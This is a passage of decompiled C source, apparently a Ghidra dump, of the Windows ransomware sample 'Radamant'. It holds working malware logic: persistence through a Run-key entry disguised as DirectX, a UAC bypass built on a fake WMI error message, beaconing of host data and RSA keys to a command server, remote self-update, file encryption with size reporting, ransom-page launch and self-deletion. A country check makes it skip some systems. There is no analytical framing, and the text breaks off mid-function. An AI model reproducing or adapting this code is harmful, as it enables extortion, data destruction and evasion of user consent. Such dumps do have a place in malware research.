  BYTE local_11c [268];
  HKEY local_10 [3];
  
  local_120 = 0x100;
  _RegOpenKeyExA_20((HKEY)0x80000002,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,1,
                    local_10);
  _RegQueryValueExA_24(local_10[0],"DirectX",(LPDWORD)0x0,(LPDWORD)0x0,local_11c,&local_120);
  _RegCloseKey_4(local_10[0]);
  return 0x100 - local_120;
}



void __cdecl __Z10setDomainsPc(char *param_1)

{
  size_t sVar1;
  char local_32c [268];
  uint local_220;
  BYTE local_21c [524];
  HKEY local_10 [3];
  
  _memset(local_21c,0,0x200);
  local_220 = 0;
  while( true ) {
    sVar1 = _strlen(param_1);
    if (sVar1 <= local_220) break;
    _sprintf((char *)local_21c,"%s%02X",local_21c,(int)param_1[local_220]);
    local_220 = local_220 + 1;
  }
  _sprintf(local_32c,"Software\\Microsoft\\%s",&_id);
  _RegCreateKeyExA_36((HKEY)0x80000001,local_32c,0,"",0,0x20006,(LPSECURITY_ATTRIBUTES)0x0,local_10,
                      (LPDWORD)0x0);
  sVar1 = _strlen((char *)local_21c);
  _RegSetValueExA_24(local_10[0],&_id,0,1,local_21c,sVar1);
  _RegCloseKey_4(local_10[0]);
  return;
}



uint __Z17getDomainsFromRegv(void)

{
  int iVar1;
  uint local_430;
  char local_42c [260];
  uint local_328;
  int local_324;
  uint local_320;
  char local_31c [256];
  BYTE local_21c [524];
  HKEY local_10 [3];
  
  _memset(local_21c,0,0x200);
  _memset(local_31c,0,0x100);
  local_328 = 0x200;
  _sprintf(local_42c,"Software\\Microsoft\\%s",&_id);
  _RegOpenKeyExA_20((HKEY)0x80000001,local_42c,0,1,local_10);
  _RegQueryValueExA_24(local_10[0],&_id,(LPDWORD)0x0,(LPDWORD)0x0,local_21c,&local_328);
  _RegCloseKey_4(local_10[0]);
  if (local_328 == 0x200) {
    local_430 = 0;
  }
  else {
    for (local_320 = 0; local_320 < local_328 >> 1; local_320 = local_320 + 1) {
      _sscanf((char *)(local_21c + local_320 * 2),"%2X",local_31c + local_320);
    }
    local_324 = 0;
    _dom_count = 0;
    for (local_320 = 0; local_320 < (local_328 >> 1) + 1; local_320 = local_320 + 1) {
      (&_domain_list)[_dom_count * 0x19 + local_324] = local_31c[local_320];
      if ((local_31c[local_320] == ' ') || (iVar1 = local_324 + 1, local_31c[local_320] == '\0')) {
        (&_domain_list)[_dom_count * 0x19 + local_324] = 0;
        _dom_count = _dom_count + 1;
        local_324 = 0;
        iVar1 = local_324;
      }
      local_324 = iVar1;
    }
    local_430 = local_328;
  }
  return local_430;
}



void __Z7DelSelfv(void)

{
  size_t sVar1;
  FILE *_File;
  char local_2bc [136];
  int local_234;
  size_t local_230;
  undefined2 local_22c;
  undefined local_22a [270];
  undefined2 local_11c;
  undefined local_11a [278];
  
  local_11c = 0;
  _memset(local_11a,0,0x102);
  local_22c = 0;
  _memset(local_22a,0,0x102);
  _GetModuleFileNameA_12((HMODULE)0x0,(LPSTR)&local_11c,0x104);
  for (local_230 = _strlen((char *)&local_11c); local_11a[local_230 - 2] != '\\';
      local_230 = local_230 - 1) {
  }
  local_234 = 0;
  while( true ) {
    local_230 = local_230 + 1;
    sVar1 = _strlen((char *)&local_11c);
    if (sVar1 <= local_230) break;
    local_22a[local_234 + -2] = local_11a[local_230 - 2];
    local_234 = local_234 + 1;
  }
  local_22a[local_234 + -2] = 0;
  _sprintf(local_2bc,"@echo off\ntaskkill /f /im %s\ndel %s /s /q\ndel %s",&local_22c,&local_11c,
           &DAT_0040d31f);
  _File = _fopen("aaa.bat","w");
  _fprintf(_File,"%s",local_2bc);
  _fclose(_File);
  _Sleep_4(500);
  _WinExec_8("aaa.bat",0);
                    // WARNING: Subroutine does not return
  _exit(0);
}



// WARNING: Type propagation algorithm not settling

undefined4 __cdecl
__Z16SendDataToServerPcS_S_mS_
          (char *param_1,undefined4 param_2,undefined4 param_3,int param_4,void *param_5)

{
  int iVar1;
  char *pcVar2;
  size_t sVar3;
  char *pcVar4;
  char *_Src;
  undefined4 local_210;
  int local_20c;
  uint local_208;
  undefined local_1fc [4];
  ulong local_1f8;
  SOCKET local_1e4;
  hostent *local_1e0;
  WSADATA local_1dc;
  char *local_40;
  char local_3c [44];
  undefined4 local_10;
  
  local_10 = 0;
  local_40 = (char *)_malloc(param_4 + 300);
  iVar1 = _WSAStartup_8(0x202,&local_1dc);
  if (iVar1 == 0) {
    local_1e0 = _gethostbyname_4(param_1);
    if (local_1e0 == (hostent *)0x0) {
      _free(local_40);
      local_210 = local_10;
    }
    else {
      pcVar2 = _inet_ntoa_4((in_addr)((in_addr *)*local_1e0->h_addr_list)->S_un);
      sVar3 = _strlen(pcVar2);
      if (sVar3 < 0x12) {
        pcVar2 = _inet_ntoa_4((in_addr)((in_addr *)*local_1e0->h_addr_list)->S_un);
        _strcpy(local_3c,pcVar2);
        _sprintf(local_40,
                 "POST /%s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: %i\r\n\r\n%s"
                 ,param_2,param_1,param_4,param_3);
        local_1e4 = _socket_12(2,1,6);
        if (local_1e4 == 0xffffffff) {
          _free(local_40);
          _closesocket_4(local_1e4);
          local_210 = local_10;
        }
        else {
          local_1fc._0_2_ = 2;
          local_1fc._2_2_ = _htons_4(0x50);
          local_1f8 = _inet_addr_4(local_3c);
          iVar1 = _connect_12(local_1e4,(sockaddr *)local_1fc,0x10);
          if (iVar1 == -1) {
            _free(local_40);
            _closesocket_4(local_1e4);
            local_210 = local_10;
          }
          else {
            sVar3 = _strlen(local_40);
            iVar1 = _send_16(local_1e4,local_40,sVar3,0);
            if (iVar1 == -1) {
              _free(local_40);
              _closesocket_4(local_1e4);
              local_210 = local_10;
            }
            else {
              pcVar2 = (char *)_malloc(8000);
              local_208 = 0;
              local_20c = 0;
              do {
                iVar1 = local_20c * 0x100;
                local_20c = local_20c + 1;
                iVar1 = _recv_16(local_1e4,pcVar2 + iVar1,0x100,0);
                local_208 = local_208 + iVar1;
                _Sleep_4(10);
              } while ((local_208 & 0xff) == 0);
              pcVar2[local_208] = '\0';
              if (pcVar2[local_208 - 1] == ']') {
                local_10 = 1;
              }
              pcVar4 = _strstr(pcVar2,"[");
              _Src = _strstr(pcVar2,"[");
              _memcpy(param_5,_Src,(local_208 - ((int)pcVar4 - (int)pcVar2)) + 1);
              _free(pcVar2);
              _free(local_40);
              _closesocket_4(local_1e4);
              local_210 = local_10;
            }
          }
        }
      }
      else {
        _free(local_40);
        local_210 = local_10;
      }
    }
    return local_210;
  }
                    // WARNING: Subroutine does not return
  _ExitProcess_4(0);
}



// WARNING: Type propagation algorithm not settling

undefined4 __cdecl __Z5GetIPPcS_S_(char *param_1,undefined4 param_2,void *param_3)

{
  int iVar1;
  char *pcVar2;
  size_t sVar3;
  char *pcVar4;
  char *pcVar5;
  undefined4 local_60c;
  char local_5fc [1020];
  int local_200;
  undefined local_1fc [4];
  ulong local_1f8;
  SOCKET local_1e4;
  hostent *local_1e0;
  WSADATA local_1dc;
  char *local_40;
  char local_3c [44];
  undefined4 local_10;
  
  local_10 = 0;
  local_40 = (char *)_malloc(300);
  iVar1 = _WSAStartup_8(0x202,&local_1dc);
  if (iVar1 != 0) {
                    // WARNING: Subroutine does not return
    _ExitProcess_4(0);
  }
  local_1e0 = _gethostbyname_4(param_1);
  if (local_1e0 == (hostent *)0x0) {
    _free(local_40);
    local_60c = local_10;
  }
  else {
    pcVar2 = _inet_ntoa_4((in_addr)((in_addr *)*local_1e0->h_addr_list)->S_un);
    sVar3 = _strlen(pcVar2);
    if (sVar3 < 0x12) {
      pcVar2 = _inet_ntoa_4((in_addr)((in_addr *)*local_1e0->h_addr_list)->S_un);
      _strcpy(local_3c,pcVar2);
      _sprintf(local_40,
               "GET /%s HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n\r\n"
               ,param_2,param_1);
      local_200 = 0;
      local_1e4 = _socket_12(2,1,6);
      if (local_1e4 == 0xffffffff) {
        _free(local_40);
        _closesocket_4(local_1e4);
        local_60c = local_10;
      }
      else {
        local_1fc._0_2_ = 2;
        local_1fc._2_2_ = _htons_4(0x50);
        local_1f8 = _inet_addr_4(local_3c);
        iVar1 = _connect_12(local_1e4,(sockaddr *)local_1fc,0x10);
        if (iVar1 == -1) {
          _free(local_40);
          _closesocket_4(local_1e4);
          local_60c = local_10;
        }
        else {
          sVar3 = _strlen(local_40);
          local_200 = _send_16(local_1e4,local_40,sVar3,0);
          if (local_200 == -1) {
            _free(local_40);
            _closesocket_4(local_1e4);
            local_60c = local_10;
          }
          else {
            _recv_16(local_1e4,local_5fc,1000,0);
            _printf("%s\n\n\n",local_5fc);
            pcVar2 = _strstr(local_5fc,"Current IP Address:");
            if (pcVar2 != (char *)0x0) {
              local_10 = 1;
              pcVar4 = _strstr(pcVar2,"<");
              pcVar5 = _strstr(pcVar2,": ");
              pcVar2 = _strstr(pcVar2,": ");
              _memcpy(param_3,pcVar2 + 2,(size_t)(pcVar4 + (-2 - (int)pcVar5)));
            }
            _free(local_5fc);
            _free(local_40);
            _closesocket_4(local_1e4);
            local_60c = local_10;
          }
        }
      }
    }
    else {
      _free(local_40);
      local_60c = local_10;
    }
  }
  return local_60c;
}



void __cdecl __Z18CreateFileOnDskTopPcS_(undefined4 param_1,undefined4 param_2)

{
  FILE *_File;
  char local_10c [264];
  
  _SHGetFolderPathA_20(0,0,0,0,local_10c);
  _sprintf(local_10c,"%s\\%s",local_10c,param_1);
  _File = _fopen(local_10c,"w");
  _fprintf(_File,"%s",param_2);
  _fclose(_File);
  return;
}



undefined4 __Z19IsUserElevatedAdminv(void)

{
  BOOL BVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  int iVar3;
  BYTE *pBVar4;
  undefined4 local_30;
  undefined4 local_24;
  PSID local_20;
  _SID_IDENTIFIER_AUTHORITY local_1c [3];
  
  iVar3 = 6;
  pBVar4 = local_1c[0].Value;
  for (; iVar3 != 0; iVar3 = iVar3 + -1) {
    *pBVar4 = '\0';
    pBVar4 = pBVar4 + 1;
  }
  local_1c[0].Value[5] = '\x05';
  BVar1 = _AllocateAndInitializeSid_44(local_1c,'\x02',0x20,0x220,0,0,0,0,0,0,&local_20);
  if (BVar1 == 0) {
    local_30 = 0;
  }
  else {
    hModule = _GetModuleHandleA_4("advapi32.dll");
    pFVar2 = _GetProcAddress_8(hModule,"CheckTokenMembership");
    iVar3 = (*pFVar2)(0,local_20,&local_24);
    if (iVar3 == 0) {
      local_24 = 0;
    }
    _FreeSid_4(local_20);
    local_30 = local_24;
  }
  return local_30;
}



uint __Z14getBuildNumberv(void)

{
  DWORD DVar1;
  uint local_c;
  
  local_c = 0;
  DVar1 = _GetVersion_0();
  if (-1 < (int)DVar1) {
    local_c = DVar1 >> 0x10;
  }
  return local_c;
}



void __Z5UACMEv(void)

{
  int iVar1;
  uint uVar2;
  DWORD DVar3;
  char local_31c [256];
  char local_21c [256];
  CHAR local_11c [268];
  HANDLE local_10;
  
  iVar1 = __Z19IsUserElevatedAdminv();
  if (iVar1 == 0) {
    uVar2 = __Z14getBuildNumberv();
    if (0x13f8 < uVar2) {
      _SHGetFolderPathA_20(0,0x24,0,0,local_31c);
      _sprintf(local_31c,"%s\\system32\\wbem\\wmic.exe",local_31c);
      _GetModuleFileNameA_12((HMODULE)0x0,local_11c,0x100);
      _sprintf(local_21c,"process call create \"cmd /c start %s\"",local_11c);
      while( true ) {
        local_10 = _CreateMutexA_12((LPSECURITY_ATTRIBUTES)0x0,1,"radamantv2.1");
        DVar3 = _GetLastError_0();
        if (DVar3 == 0xb7) break;
        _ReleaseMutex_4(local_10);
        _CloseHandle_4(local_10);
        _MessageBoxA_16((HWND)0x0,
                        "Missing or Failing WMI Providers or Invalid WMI Class.\nRun WMI to check the status and fix errors."
                        ,"WMI Critical Error",0x10);
        _ShellExecuteA_24((HWND)0x0,"runas",local_31c,local_21c,(LPCSTR)0x0,0);
        _Sleep_4(3000);
      }
                    // WARNING: Subroutine does not return
      _exit(0);
    }
  }
  return;
}



void __cdecl __Z9getmyHASHPc(int param_1)

{
  FILE *_File;
  int iVar1;
  size_t unaff_EBX;
  undefined *puVar2;
  int iStack100436;
  int iStack100432;
  undefined uStack100428;
  undefined auStack100427 [15];
  int aiStack100412 [26];
  undefined4 uStack100308;
  int iStack100304;
  undefined auStack100300 [100016];
  undefined2 local_11c;
  undefined local_11a [266];
  undefined4 uStack16;
  
  uStack16 = 0x40539b;
  __alloca(unaff_EBX);
  local_11c = 0;
  uStack16 = 0x4053c8;
  _memset(local_11a,0,0x102);
  uStack16 = 0x4053e6;
  _GetModuleFileNameA_12((HMODULE)0x0,(LPSTR)&local_11c,0x104);
  uStack16 = 0x4053ff;
  _File = _fopen((char *)&local_11c,"rb");
  iStack100304 = 0;
  while( true ) {
    uStack16 = 0x40541d;
    iVar1 = _feof(_File);
    if (iVar1 != 0) break;
    puVar2 = auStack100300 + iStack100304;
    uStack16 = 0x40543e;
    iVar1 = _fgetc(_File);
    *puVar2 = (char)iVar1;
    iStack100304 = iStack100304 + 1;
  }
  uStack16 = 0x405458;
  _fclose(_File);
  uStack100308 = 0;
  uStack16 = 0x40547a;
  __ZN3MD57MD5InitEP7MD5_CTX(0,aiStack100412);
  uStack16 = 0x4054a7;
  __ZN3MD59MD5UpdateEP7MD5_CTXPhj(uStack100308,aiStack100412,(int)auStack100300,iStack100304 - 1);
  uStack100428 = 0;
  puVar2 = auStack100427;
  for (iVar1 = 0xf; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  uStack16 = 0x4054e6;
  __ZN3MD58MD5FinalEPhP7MD5_CTX(uStack100308,(int)&uStack100428,aiStack100412);
  iStack100432 = 0;
  for (iStack100436 = 0; iStack100436 < 0x10; iStack100436 = iStack100436 + 1) {
    uStack16 = 0x405531;
    _sprintf((char *)(iStack100432 + param_1),"%02x");
    iStack100432 = iStack100432 + 2;
  }
  return;
}



undefined4 __cdecl __Z8DownloadPc(int param_1)

{
  size_t sVar1;
  FILE *_File;
  int iVar2;
  size_t unaff_EDI;
  undefined4 *puVar3;
  undefined4 local_1360;
  char local_134c [4096];
  char local_34c [256];
  undefined4 local_24c;
  undefined4 local_20c [17];
  int local_1c8;
  size_t local_1c4;
  hostent *local_1c0;
  undefined local_1bc [4];
  undefined4 local_1b8;
  SOCKET local_1a0;
  WSADATA local_19c;
  undefined4 local_c;
  
  local_c = 0x40555a;
  __alloca(unaff_EDI);
  puVar3 = local_20c;
  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  puVar3 = &local_24c;
  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  for (local_1c4 = 0; *(char *)(param_1 + local_1c4) != '/'; local_1c4 = local_1c4 + 1) {
    *(undefined *)((int)local_20c + local_1c4) = *(undefined *)(param_1 + local_1c4);
  }
  local_1c8 = 0;
  while (local_1c4 = local_1c4 + 1, *(char *)(param_1 + local_1c4) != '\0') {
    *(undefined *)((int)&local_24c + local_1c8) = *(undefined *)(param_1 + local_1c4);
    local_1c8 = local_1c8 + 1;
  }
  local_c = 0x405637;
  _memset(local_34c,0,0xff);
  local_c = 0x405661;
  _sprintf(local_34c,"GET /%s HTTP/1.0\r\nHost: %s\r\n\r\n");
  local_c = 0x405677;
  iVar2 = _WSAStartup_8(0x101,&local_19c);
  if (iVar2 == 0) {
    local_c = 0x4056a9;
    local_1a0 = _socket_12(2,1,6);
    if (local_1a0 == 0xffffffff) {
      local_1360 = 0xfffffffe;
    }
    else {
      local_c = 0x4056d8;
      local_1c0 = _gethostbyname_4((char *)local_20c);
      if (local_1c0 == (hostent *)0x0) {
        local_1360 = 0xfffffffd;
      }
      else {
        local_1bc._0_2_ = 2;
        local_1b8 = *(undefined4 *)*local_1c0->h_addr_list;
        local_c = 0x405721;
        local_1bc._2_2_ = _htons_4(0x50);
        local_c = 0x40574b;
        iVar2 = _connect_12(local_1a0,(sockaddr *)local_1bc,0x10);
        if (iVar2 == -1) {
          local_1360 = 0xfffffffc;
        }
        else {
          local_c = 0x40578a;
          iVar2 = _send_16(local_1a0,local_34c,0xff,0);
          if (iVar2 == -1) {
            local_1360 = 0xfffffffb;
          }
          else {
            local_c = 0x4057af;
            for (local_1c4 = _strlen((char *)&local_24c);
                (0 < (int)local_1c4 && (*(char *)((int)&local_24c + local_1c4) != '/'));
                local_1c4 = local_1c4 - 1) {
            }
            local_1c8 = 0;
            while( true ) {
              local_c = 0x4057f5;
              sVar1 = _strlen((char *)&local_24c);
              if (sVar1 <= local_1c4) break;
              *(undefined *)((int)&local_24c + local_1c8) =
                   *(undefined *)((int)&local_24c + local_1c4 + 1);
              local_1c8 = local_1c8 + 1;
              local_1c4 = local_1c4 + 1;
            }
            local_c = 0x405849;
            _File = _fopen((char *)&local_24c,"wb");
            local_c = 0x405877;
            iVar2 = _recv_16(local_1a0,local_134c,0x800,0);
            for (local_1c4 = 0;
                ((int)local_1c4 < iVar2 &&
                ((((local_134c[local_1c4] != '\r' || (local_134c[local_1c4 + 1] != '\n')) ||
                  (local_134c[local_1c4 + 2] != '\r')) || (local_134c[local_1c4 + 3] != '\n'))));
                local_1c4 = local_1c4 + 1) {
            }
            for (local_1c4 = local_1c4 + 4; (int)local_1c4 < iVar2; local_1c4 = local_1c4 + 1) {
              local_c = 0x405932;
              _fprintf(_File,"%c");
            }
            do {
              local_c = 0x405964;
              iVar2 = _recv_16(local_1a0,local_134c,0x800,0);
              for (local_1c4 = 0; (int)local_1c4 < iVar2; local_1c4 = local_1c4 + 1) {
                local_c = 0x4059b0;
                _fprintf(_File,"%c");
              }
            } while (0 < iVar2);
            local_c = 0x4059d6;
            _fclose(_File);
            local_c = 0x4059e4;
            iVar2 = _closesocket_4(local_1a0);
            if (iVar2 == -1) {
              local_1360 = 0xfffffff9;
            }
            else {
              local_1360 = 1;
            }
          }
        }
      }
    }
  }
  else {
    local_1360 = 0xffffffff;
  }
  return local_1360;
}



undefined4 __Z9update_mev(void)

{
  size_t sVar1;
  int iVar2;
  size_t sVar3;
  FILE *_File;
  int local_364;
  size_t local_360;
  undefined2 local_35c;
  undefined local_35a [270];
  undefined2 local_24c;
  undefined local_24a [270];
  char local_13c [312];
  
  _sprintf(local_13c,_S_Build,&_domain_list + _cur_domain * 0x19);
  iVar2 = __Z8DownloadPc((int)local_13c);
  if (iVar2 == 0) {
    return 0;
  }
  local_24c = 0;
  _memset(local_24a,0,0x102);
  local_35c = 0;
  _memset(local_35a,0,0x102);
  _GetModuleFileNameA_12((HMODULE)0x0,(LPSTR)&local_24c,0x104);
  for (local_360 = _strlen((char *)&local_24c); local_24a[local_360 - 2] != '\\';
      local_360 = local_360 - 1) {
  }
  local_364 = 0;
  sVar1 = local_360;
  while( true ) {
    local_360 = sVar1 + 1;
    sVar3 = _strlen((char *)&local_24c);
    if (sVar3 <= local_360) break;
    local_35a[local_364 + -2] = local_24a[sVar1 - 1];
    local_364 = local_364 + 1;
    sVar1 = local_360;
  }
  local_35a[local_364 + -2] = 0;
  _sprintf(local_13c,
           "@echo off\ntaskkill /f /im %s\ndel %s /s /q\nrename build.exe %s\nstart %s\ndel %s",
           &local_35c,&local_24c,&local_35c,&local_35c,&DAT_0040d31f);
  _File = _fopen("aaa.bat","w");
  _fprintf(_File,"%s",local_13c);
  _fclose(_File);
  _WinExec_8("aaa.bat",0);
                    // WARNING: Subroutine does not return
  _exit(0);
}



undefined4 __Z10SendMyInfov(void)

{
  uint uVar1;
  size_t sVar2;
  char *pcVar3;
  char *pcVar4;
  CHAR *pCVar5;
  undefined *puVar6;
  undefined local_8c [32];
  char local_6c [32];
  CHAR local_4c [32];
  uint local_2c;
  void *local_28;
  char *local_24;
  DWORD local_20;
  DWORD local_1c;
  BYTE *local_18;
  BYTE *local_14;
  undefined4 local_10;
  
  local_10 = 1;
  local_14 = (BYTE *)_VirtualAlloc_16((LPVOID)0x0,0x123,0x3000,4);
  local_18 = (BYTE *)_VirtualAlloc_16((LPVOID)0x0,0x515,0x3000,4);
  local_24 = (char *)_malloc(6000);
  local_28 = _malloc(6000);
  __Z11GetProcBitsPc(local_4c);
  __Z17getWindowsVersionPc(local_6c);
  __Z8getDiscsPc((int)local_8c);
  __Z15generateRSAkeysPhPmS_S0_(local_14,&local_1c,local_18,&local_20);
  puVar6 = local_8c;
  pCVar5 = local_4c;
  pcVar4 = _sIP;
  pcVar3 = local_6c;
  uVar1 = _APT;
  _sprintf(local_24,"id=%s&apt=%i&os=%s&ip=%s&bits=%s&discs=%s&pub=",&_id,_APT,pcVar3,_sIP,pCVar5,
           puVar6);
  for (local_2c = 0; (int)local_2c < 0x114; local_2c = local_2c + 1) {
    uVar1 = (uint)local_14[local_2c];
    _sprintf(local_24,"%s%02X",local_24,uVar1,pcVar3,pcVar4,pCVar5,puVar6);
  }
  _sprintf(local_24,"%s&prv=",local_24,uVar1,pcVar3,pcVar4,pCVar5,puVar6);
  for (local_2c = 0; (int)local_2c < 0x494; local_2c = local_2c + 1) {
    _sprintf(local_24,"%s%02X",local_24,(uint)local_18[local_2c],pcVar3,pcVar4,pCVar5,puVar6);
  }
  sVar2 = _strlen(local_24);
  __Z16SendDataToServerPcS_S_mS_(&_domain,_gate,local_24,sVar2,local_28);
  local_2c = 0;
  while( true ) {
    sVar2 = _strlen(local_24);
    if (sVar2 <= local_2c) break;
    local_24[local_2c] = '\0';
    local_2c = local_2c + 1;
  }
  for (local_2c = 0; (int)local_2c < 0x494; local_2c = local_2c + 1) {
    local_18[local_2c] = '\0';
  }
  _free(local_28);
  _free(local_24);
  return local_10;
}



undefined4 __cdecl __Z10encrypt_PCPc(int param_1)

{
  size_t sVar1;
  int local_290;
  char local_28c [72];
  int local_244;
  uint local_240;
  BYTE local_23c [568];
  
  local_244 = 0;
  for (local_240 = 0; local_240 < 0x114; local_240 = local_240 + 1) {
    _sscanf((char *)(local_240 * 2 + param_1),"%2X",local_23c + local_240);
  }
  if (_exts == '\0') {
    __Z16SendDataToServerPcS_S_mS_(&_domain,_masks,&DAT_0040d1c1,0,&_exts);
  }
  __Z17FindAndCryprFilesPhm(local_23c,local_240);
  __Z20GetEncryptedFileSizePi(&local_244);
  local_290 = local_244;
  if (local_244 < 0) {
    local_290 = local_244 + 0xfffff;
  }
  local_244 = local_290 >> 0x14;
  if (_FilesSize != local_244) {
    _FilesSize = local_244;
    _sprintf(local_28c,"id=%s&s=%i",&_id,local_244);
    sVar1 = _strlen(local_28c);
    __Z16SendDataToServerPcS_S_mS_(&_domain,_gate,local_28c,sVar1,local_28c);
  }
  return 1;
}



undefined4 __cdecl __Z10decrypt_PCPc(int param_1)

{
  uint local_940;
  BYTE local_93c [2360];
  
  for (local_940 = 0; local_940 < 0x494; local_940 = local_940 + 1) {
    _sscanf((char *)(local_940 * 2 + param_1),"%2X",local_93c + local_940);
  }
  __Z19FindAndDecryprFilesPhm(local_93c,local_940);
  return 1;
}



void __Z11copyMeToWinv(void)

{
  BOOL BVar1;
  CHAR local_20c [256];
  char local_10c [264];
  
  __Z5UACMEv();
  _GetModuleFileNameA_12((HMODULE)0x0,local_20c,0x100);
  _SHGetFolderPathA_20(0,0x1a,0,0,local_10c);
  _sprintf(local_10c,"%s\\DirectX.exe",local_10c);
  BVar1 = _CopyFileA_12(local_20c,local_10c,0);
  if (BVar1 != 0) {
    _SetFileAttributesA_8(local_10c,6);
    _ShellExecuteA_24((HWND)0x0,"open",local_10c,(LPCSTR)0x0,(LPCSTR)0x0,5);
    _Sleep_4(5000);
    __Z7DelSelfv();
  }
  return;
}



void __Z13check_my_pathv(void)

{
  CHAR local_20c [256];
  char local_10c [264];
  
  _GetModuleFileNameA_12((HMODULE)0x0,local_20c,0x100);
  _SHGetFolderPathA_20(0,0x1a,0,0,local_10c);
  _sprintf(local_10c,"%s\\directx.exe",local_10c);
  _printf("%s\n%s",local_20c,local_10c);
  __Z9my_strcmpPcS_(local_20c,local_10c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl __Z12exec_commandPc(char *param_1)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = _strstr(param_1,"[6:UA]");
  if (((((pcVar1 != (char *)0x0) || (pcVar1 = _strstr(param_1,"[6:RU]"), pcVar1 != (char *)0x0)) ||
       (pcVar1 = _strstr(param_1,"[6:KZ]"), pcVar1 != (char *)0x0)) ||
      (pcVar1 = _strstr(param_1,"[6:BY]"), pcVar1 != (char *)0x0)) && (_APT == 0)) {
    __Z7DelSelfv();
  }
  pcVar1 = _strstr(param_1,"[8:");
  if (pcVar1 != (char *)0x0) {
    pcVar1 = _strstr(param_1,"[8:");
    pcVar1[0x23] = '\0';
    iVar2 = __Z9my_strcmpPcS_(pcVar1 + 3,&_MY_HASH);
    if (iVar2 == 0) {
      __Z9update_mev();
    }
  }
  pcVar1 = _strstr(param_1,"[0:");
  if (pcVar1 != (char *)0x0) {
    __Z7SetARunv();
    __Z10SendMyInfov();
  }
  pcVar1 = _strstr(param_1,"[1:");
  if ((pcVar1 != (char *)0x0) && (_FilesSize == -1)) {
    pcVar1 = _strstr(param_1,"[1:");
    __Z10encrypt_PCPc((int)(pcVar1 + 3));
    __fl_showform = 1;
    _DAT_0040c000 = 60000;
  }
  pcVar1 = _strstr(param_1,"[2:");
  if (pcVar1 != (char *)0x0) {
    _MessageBoxA_16((HWND)0x0,
                    "Now begins the decryption of your files! Do not turn off the power and turn on the carriers that have been encrypted! When you\'re ready, click \"OK\"."
                    ,"Radamant",0x40);
    do {
      pcVar1 = _strstr(param_1,"[2:");
      __Z10decrypt_PCPc((int)(pcVar1 + 3));
      iVar2 = _MessageBoxA_16((HWND)0x0,"Do you want rescan your system?","Radamant",4);
    } while (iVar2 == 6);
    _MessageBoxA_16((HWND)0x0,"Your system was decrypted.","Radamant",0x40);
    _Sleep_4(5000);
    __Z7DelARunv();
    __Z7DelSelfv();
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void _WinMain_16(void)

{
  int iVar1;
  DWORD DVar2;
  uint uVar3;
  size_t sVar4;
  time_t tVar5;
  char local_8c [124];
  char *local_10;
  
  iVar1 = __Z13check_my_pathv();
  if (iVar1 == 0) {
    __Z11copyMeToWinv();
  }
  iVar1 = __Z9checkARunv();
  if (iVar1 == 0) {
    __Z5UACMEv();
  }
  iVar1 = __Z9checkARunv();
  if (iVar1 == 0) {
    __Z7SetARunv();
  }
  _CreateMutexA_12((LPSECURITY_ATTRIBUTES)0x0,1,"radamantv2.1");
  DVar2 = _GetLastError_0();
  if (DVar2 != 0xb7) {
    tVar5 = _time((time_t *)0x0);
    _srand((uint)tVar5);
    __Z9getmyHASHPc((int)&_MY_HASH);
    __Z5getIDPc((int)&_id);
    __Z14decrypt_domainPc(&_domain);
    local_10 = (char *)0x0;
    while (((int)local_10 < 3 &&
           (iVar1 = __Z5GetIPPcS_S_("checkip.dyndns.org",&DAT_0040d1c1,_sIP), iVar1 != 1))) {
      _Sleep_4(3000);
      local_10 = local_10 + 1;
    }
    while (uVar3 = __Z17getDomainsFromRegv(), uVar3 == 0) {
      local_10 = (char *)_malloc(6000);
      __Z16SendDataToServerPcS_S_mS_(&_domain,_domains,&DAT_0040d1c1,0,local_10);
      sVar4 = _strlen(local_10);
      local_10[sVar4 - 1] = '\0';
      __Z10setDomainsPc(local_10 + 3);
      _free(local_10);
    }
    __beginthread((_StartAddress *)&__Z6doworkPv,0,(void *)0x0);
    while (__fl_showform == 0) {
      _Sleep_4(2000);
    }
    _sprintf(local_8c,_S_Landing,&_domain_list + _cur_domain * 0x19,&_id);
    _ShellExecuteA_24((HWND)0x0,"open",local_8c,(LPCSTR)0x0,(LPCSTR)0x0,5);
    _sprintf(local_8c,_S_Shtrcut,&_domain_list + _cur_domain * 0x19,&_id);
    __Z18CreateFileOnDskTopPcS_("YOUR_FILES.url",local_8c);
    do {
      _Sleep_4(10000);
    } while( true );
  }
                    // WARNING: Subroutine does not return
  _exit(0);
}



void __Z14aes_gen_tablesv(void)

{
  byte bVar1;
  byte bVar2;
  byte bVar3;
  byte bVar4;
  byte bVar5;
  bool bVar6;
  uint local_240;
  uint local_23c;
  uint local_238;
  uint local_234;
  byte local_221;
  byte abStack540 [256];
  byte abStack284 [267];
  byte local_11;
  int local_10;
  
  local_10 = 0;
  local_11 = 1;
  while (local_10 < 0x100) {
    abStack284[local_10] = local_11;
    abStack540[local_11] = (byte)local_10;
    local_10 = local_10 + 1;
    local_221 = local_11 << 1;
    if ((char)local_11 < '\0') {
      local_221 = local_221 ^ 0x1b;
    }
    local_221 = local_221 ^ local_11;
    local_11 = local_221;
  }
  local_10 = 0;
  local_11 = 1;
  while (local_10 < 10) {
    *(uint *)(&_RCON + local_10 * 4) = (uint)local_11 << 0x18;
    local_10 = local_10 + 1;
    bVar5 = local_11 * '\x02';
    bVar6 = (char)local_11 < '\0';
    local_11 = bVar5;
    if (bVar6) {
      local_11 = bVar5 ^ 0x1b;
    }
  }
  _FSb = 99;
  DAT_00411b13 = 0;
  for (local_10 = 1; local_10 < 0x100; local_10 = local_10 + 1) {
    bVar5 = abStack284[0xff - (uint)abStack540[local_10]];
    bVar2 = bVar5 >> 7 | bVar5 * '\x02';
    bVar4 = bVar2 * '\x02';
    bVar3 = (byte)(bVar5 * '\x02') >> 7 | bVar4;
    bVar1 = bVar3 * '\x02';
    bVar4 = bVar4 >> 7 | bVar1;
